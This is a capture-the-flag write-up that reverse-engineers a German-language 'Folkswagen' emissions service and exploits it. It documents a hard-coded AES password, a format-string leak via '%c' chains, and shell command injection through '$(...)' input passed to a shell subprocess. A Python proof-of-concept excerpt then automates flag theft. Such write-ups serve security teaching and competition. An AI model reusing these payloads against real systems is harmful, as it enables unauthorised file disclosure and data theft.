# Folkswagen Emissions

## Description

> This service offers two functions. The first is a tool to check if your
> Folkswagen car has issues with its emmission values, by entering a frame
> number. Folkswagen frame numbers have to be formed in a specific way. Here is
> an example WVWZZZ161NZ331205. The first three caracters are the the WMI from
> the manufacture. These are always followed by ZZZ. The next three caracters
> are the car typ followed by the modelyear. The 11. caracter is the
> manufacturing plant valid caracters are(A-Z|0-9). The last 6 caracters are a
> number from 000000 to 999999. Since Folkswagen is a bavarian company, this
> service is in bavarian, a german dialect. But we offer a translator that
> translates bavarian words to german, though it might not be that helpful.

This service of the team *in23canation* provides a way to store Folkswagen
cars issues in a secure way. To do so a user can perform 4 different actions:
* Store a new car issue
* Retrieve a car issue
* Decrypt the report
* Translate from bavarian to german

If you don't know where to start don't miss the `help` command.

While the frontend is provided by a python script, all 4 actions are later
delegated to 3 stripped binaries. The python script works with 4 differents
modes which are associated with each actions:
- default one to retrieve reports
- translator: entered with `I ko koa bayrisch`
- setflag: entered with `addfzn`
- getflag: entered with `decrypt`

```
                 +-----------+
                 | translate |
                 +-----+-----+
                       ^
                       |
                       v
+---------+       +----+----+       +---------+
| setFlag +<----->+ Reports +<----->+ getFlag |
+---------+       +--+---+--+       +---------+
            ---      ^   |      --- 
          /     \    |   |    /     \ 
         | start +---+   +-->+ exit  |
          \     /             \     /
            ---                 ---
```

| Mode        | Enter command     | Exit command | Binary used   |
| ----------: | :---------------: | :----------: | :------------ |
| Reports     | *default*         | exit or quit | `abgaswerte`  |
| Translate   | I ko koa bayrisch | exit or quit | `uebersetzer` |
| Set Flag    | addfzn            | exit or quit | `setflag`     |
| Get Flag    | decrypt           | exit or quit | `setflag -h`  |

Radare2 scripts are available for each of these binaries, under the `radare2`
directory.

### abgaswerte

This binary is used to check the issues with emission values of cars. It take
as argument the *car frame number* to check.

It first generates a regex used to check that the *frame number* is valid. This
regex looks like that:

```regex
^(WVW|WV2|1VW|3VW|9BW|AAV)(ZZZ)?(or_list_of_car_types)([ABCDEFGHJKLMNPRSTVWXY]|[0-9])([ABCDEFGHJKLMNPRSTUVWXYZ]|[0-9])[0-9]{6}
```

`or_list_of_car_types` is dynamically constructed from the file
`rw/info/Fahrzeugtypen.csv`. It's a regex OR-ed list of the first field of each
line, ie. separated with `|`.

If the regex matches the *frame number*, the binary returns the result of the
command
```bash
cat ../rw/info/Fahrzeugnummern.csv | grep %s | head -1 | awk -F ';' '{print $2}'
```
with `%s` being replaced with the *frame number*.

What is returned if actually the base64 of the ciphered *flag*. See
[setflag](#setflag).

### ueberstzer

This binary finds the translation of a given *bavarian word*. It first executes
```
openssl aes-256-cbc -d -in ../rw/info/Bayrisch.csv.enc -out temp_file -pass pass:Â§acf578?#*+-463-{{}av@wer637,,..
```
where `temp_file` is randomly generated.

Then it reads the file, finds the line where the first csv field matches the 
word to translate and returns the second field which corresponds to the
translation.

At the end, the temporary file is also removed.

### setflag

This binary has 2 purposes: set and get a *flag*.

To set a flag, the binary takes 3 arguments:
1. a useless argument which seems to be the *flag_id*
2. the *car frame number* and the *bavarian password* separated with `-.-`
3. the *flag*

To get a flag, this 3 arguments are needed:
1. `-h` option
2. *ciphered flag* of the car emission tests.
3. german traduction of the *bavarian password*


#### Get flag

The binary only executes the following command and returns its output:
```python
"echo %s | openssl enc -d -aes-256-cbc -a -k %s" % (ciphered_flag, password)
```

#### Set flag

First, the *car frame number* and the *bavarian password* are extracted from
the second argument. A german translation of the *bavarian password* is then 
randomly generated and the flag is encrypted with it:
```python
"echo %s | openssl enc -e -aes-256-cbc -a -k %s" % (flag, german_password)
```

The two files which store the data are finally modified.
* `rw/info/Fahrzeugnummern.csv` is appended with the new *car frame number* and
its associated encrypted *flag*.
* `rw/info/Bayrisch.csv.enc` is appended with the new translation. To do so, it
is first decrypted, then modified and finally re-encrypted.


### Flag_id

Flag Description:

> The first 6 caracters of the flag id are the first 6 caracters of a car frame
> number, the following 4 caracters are the first 4 caracters of a word from
> the translator.

We saw that in order to register a flag we needed to provide a *car frame
number* and a *bavarian password*. Thus the *flag_id* is composed of their
first characters.


## Vulnerabilities

It's actually easier to find vulnerabilities than to understand how the service
works to be able to exploit it.

### Format string

The first vulnerability, is located in the translation mode. When asking for a
translation, the output includes our word:
```
Welches bayrische Wort moechten sie wissen?
translate_me

Das Wort translate_me
Bitte entschuldigen Sie, das Wort konnte nicht gefunden werden
 in deutsch.
```

The first reaction is naturally to type a format string:
```
Welches bayrische Wort moechten sie wissen?
%08x

Das Wort 00000000
Bitte entschuldigen Sie, das Wort konnte nicht gefunden werden
 in deutsch.
```

### Shell command injection

Another vulnerability way more interesting is located in the python script
itself.

All calls to the binaries is handled through a shell subprocess.
```python
def execute_shell(command, error=''):
    return subprocess.Popen(command, shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
```

However, all parameters are provided in commands inside double quotes:
```python
if not "\"" in data:
  r = execute_shell("../ro/uebersetzer \"" + data + "\"")
```
As double quotes doesn't escape shell special characters, it's possible to
execute subcommands to get extra data. As the input of the translation binary
is also printed, we can retrieve it.

```
Welches bayrische Wort moechten sie wissen?
$(ls info)

Das Wort Bayrisch.csv.enc
Fahrzeugnummern.csv
Fahrzeugtypen.csv
Hersteller.csv
Modelljahr.csv
Bitte entschuldigen Sie, das Wort konnte nicht gefunden werden
 in deutsch.
```

## Proof of Concept

### Using shell command injection
With the shell command injection we can easily retrieve any file including
`rw/info/Bayrisch.csv.enc` and `rw/info/Fahrzeugnummern.csv`. We can also
decrypt `Bayrisch.csv.enc` with the known hard-coded AES key.

A search in both files gives us the ciphered flag and the AES key to decipher
it.

### Mixing both vulnerabilities

To have more fun, we'll use the format string vulnerability to retrieve a 
plaintext version of `rw/info/Bayrisch.csv`.

```asm
|       ,=< 0x00401293      e99a000000     jmp 0x401332               
|       |   ; JMP XREF from 0x0040133b (fcn.translate)
|      .--> 0x00401298      8b45f8         mov eax, dword [rbp - k]
|      ||   0x0040129b      4898           cdqe
|      ||   0x0040129d      488b84c540ac.  mov rax, qword [rbp + rax*8 - 0x53c0]
|      ||   0x004012a5      48898568feff.  mov qword [rbp - line], rax
|      ||   0x004012ac      488b8568feff.  mov rax, qword [rbp - line]
|      ||   0x004012b3      4889c7         mov rdi, rax
|      ||   0x004012b6      e825f5ffff     call sym.imp.strlen
|      ||   0x004012bb      898574feffff   mov dword [rbp - line_len], eax
|      ||   0x004012c1      c745fc000000.  mov dword [rbp - j], 0
|     ,===< 0x004012c8      eb18           jmp 0x4012e2               
|     |||   ; JMP XREF from 0x004012eb (fcn.translate)
|    .----> 0x004012ca      8b45fc         mov eax, dword [rbp - j]
|    ||||   0x004012cd      4863d0         movsxd rdx, eax
|    ||||   0x004012d0      488b8568feff.  mov rax, qword [rbp - line]
|    ||||   0x004012d7      4801d0         add rax, rdx
|    ||||   0x004012da      0fb600         movzx eax, byte [rax]
|    ||||   0x004012dd      50             push rax
|    ||||   0x004012de      8345fc01       add dword [rbp - j], 1
|    ||||   ; JMP XREF from 0x004012c8 (fcn.translate)
|    |`---> 0x004012e2      8b45fc         mov eax, dword [rbp - j]
|    | ||   0x004012e5      3b8574feffff   cmp eax, dword [rbp - line_len]
|    `====< 0x004012eb      7cdd           jl 0x4012ca                
|      ||   0x004012ed      488b8578feff.  mov rax, qword [rbp - 4242_str]
|      ||   0x004012f4      4889c7         mov rdi, rax
|      ||   0x004012f7      e8e4f4ffff     call sym.imp.strlen
|      ||   0x004012fc      898574feffff   mov dword [rbp - line_len], eax
|      ||   0x00401302      c745fc000000.  mov dword [rbp - j], 0
|     ,===< 0x00401309      eb18           jmp 0x401323               
|     |||   ; JMP XREF from 0x0040132c (fcn.translate)
|    .----> 0x0040130b      8b45fc         mov eax, dword [rbp - j]
|    ||||   0x0040130e      4863d0         movsxd rdx, eax
|    ||||   0x00401311      488b8578feff.  mov rax, qword [rbp - 4242_str]
|    ||||   0x00401318      4801d0         add rax, rdx
|    ||||   0x0040131b      0fb600         movzx eax, byte [rax]
|    ||||   0x0040131e      50             push rax
|    ||||   0x0040131f      8345fc01       add dword [rbp - j], 1
|    ||||   ; JMP XREF from 0x00401309 (fcn.translate)
|    |`---> 0x00401323      8b45fc         mov eax, dword [rbp - j]
|    | ||   0x00401326      3b8574feffff   cmp eax, dword [rbp - line_len]
|    `====< 0x0040132c      7cdd           jl 0x40130b                
|      ||   0x0040132e      8345f801       add dword [rbp - k], 1
|      ||   ; JMP XREF from 0x00401293 (fcn.translate)
|      |`-> 0x00401332      8b45f8         mov eax, dword [rbp - k]
|      |    0x00401335      3b8584feffff   cmp eax, dword [rbp - num_line]
|      `==< 0x0040133b      0f8c57ffffff   jl 0x401298                
```

Actually, after being decrypted, the file is pushed on the stack by the
previous loop. Each line of the file is separated with the string `\n4242`.
Each character is push one after another which means each character is stored
in a quad word and in reverse order, if read with increasing memory addresses.
We must then use `%c` to retrieve each character.

```
Welches bayrische Wort moechten sie wissen?
%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c

Das Wort w�2424
lPoEetaDtDlTz1id;lccmhusiosnmclw2424
EJiKMJQOJppX8Tkz;lrkzarzru2424
nujZuA9PYTvVSo1R;vpwdurzcdcldo2424
gu6jDO8C4mMRJRSE;nhyjhgfwpreqb2424
wVDzIAfwLu3sziLP;wjmhhsatasckoa2424
e1zbJgJ5XbjCkc28;qvvgfotzot2424
lqHCWuqvFPJNH6cc;uhvwyswsdjopc2424
g0DKE
Bitte entschuldigen Sie, das Wort konnte nicht gefunden werden
 in deutsch.
```

Of course, the part of the file we get must be reversed to get it right. This
way of getting the file is interesting in a CTF because it's very easy to
modify a string in a binary like an AES key. But its a bit more
time-consuming to modify the code to prevent retrieving the file using this
vulnerability.

### Automation

The script [poc.py][poc] uses the previous principle to retrieve a *flag*.
It first greps the file `rw/info/Fahrzeugnummern.csv` to retrieve all frame
numbers which may match the corresponding part in the *flag_id*.
```python
conn.sendline("$(grep %s info/Fahrzeugnummern.csv)" % frame_search)
conn.expect(TRANSLATE_PROMPT)
flags = re.findall(
        r'^(?:Das Wort )?([0-9A-Z]+);([a-zA-Z0-9+/]+)$',
        conn.before, re.M
        )
```

Then it uses the format string vulnerability to retrieve the list of
translation and searches for possible translation:
```python
conn.sendline("%c" * MAX_ARG_LEN)
conn.expect(TRANSLATE_PROMPT)
passwords = re.findall(
        r'^([a-zA-Z0-9]+);[a-z]+%s' % (word_search[::-1],),
            conn.before, re.M
        )
```

Finally, we locally try to decrypt each cipher with each password.

```bash
$ ./poc.py 192.168.56.101 20104 3VWZZZufdc
FLGwwZzk0f5D0KWz
```


[poc]: poc.py
